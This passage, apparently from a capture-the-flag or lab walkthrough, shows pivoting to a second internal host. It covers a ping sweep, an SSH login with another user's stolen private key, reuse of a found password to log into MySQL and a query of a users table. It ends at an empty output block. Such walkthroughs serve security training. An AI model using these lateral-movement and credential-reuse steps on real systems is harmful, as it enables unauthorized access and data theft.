7. Pivoting to Host2
Network Discovery
From Host1, scan the internal network for other live hosts:

bash
for ip in $(seq 1 255); do ping -c 1 172.16.20.$ip; done
We identify a second host at 172.16.20.6.

SSH Pivoting
The user mike's SSH private key is located in /home/mike/.ssh/id_rsa. Use it to connect to Host2:

bash
ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.6
Accept the host key and log in successfully:

text
mike@host2:~$
8. Privilege Escalation on Host2
Enumeration
Check listening services:

bash
ss -tunlp
Port 3306 (MySQL) is listening locally.

Access MySQL
Attempt to log into MySQL using known credentials:

bash
mysql -u mike -p
Enter the previously found password password. Login succeeds.

Enumerate Databases
sql
show databases;
use accounts;
select * from users;
Output:

text
